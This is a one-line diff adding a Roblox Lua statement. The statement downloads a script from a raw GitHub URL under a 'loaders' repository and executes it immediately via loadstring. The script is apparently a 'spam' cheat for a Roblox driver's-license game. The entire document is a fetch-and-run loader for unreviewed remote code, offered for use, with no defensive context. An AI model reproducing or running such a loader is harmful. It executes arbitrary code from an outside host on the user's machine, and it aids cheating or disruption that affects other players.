@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/get-your-driver-s-license-spam1-h5oac0l3o6nver.lua"))()
